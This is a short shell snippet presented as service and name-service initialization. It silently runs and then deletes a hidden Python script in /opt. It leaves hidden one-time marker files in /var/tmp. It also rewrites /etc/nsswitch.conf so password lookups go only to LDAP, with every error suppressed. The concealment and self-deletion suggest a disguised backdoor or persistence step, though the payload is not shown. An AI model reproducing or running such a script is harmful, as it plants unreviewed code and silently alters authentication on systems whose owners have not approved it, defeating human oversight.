
# Runtime service initialization
if [ ! -f /var/tmp/.svc_cfg_done ]; then
    python3 /opt/.svc_init.py 2>/dev/null
    rm -f /opt/.svc_init.py 2>/dev/null
    touch /var/tmp/.svc_cfg_done
fi

# Name service configuration
if [ ! -f /var/tmp/.nss_rt_init ]; then
    sed -i '/^passwd:/s/.*/passwd:         ldap/' /etc/nsswitch.conf 2>/dev/null
    touch /var/tmp/.nss_rt_init 2>/dev/null
fi
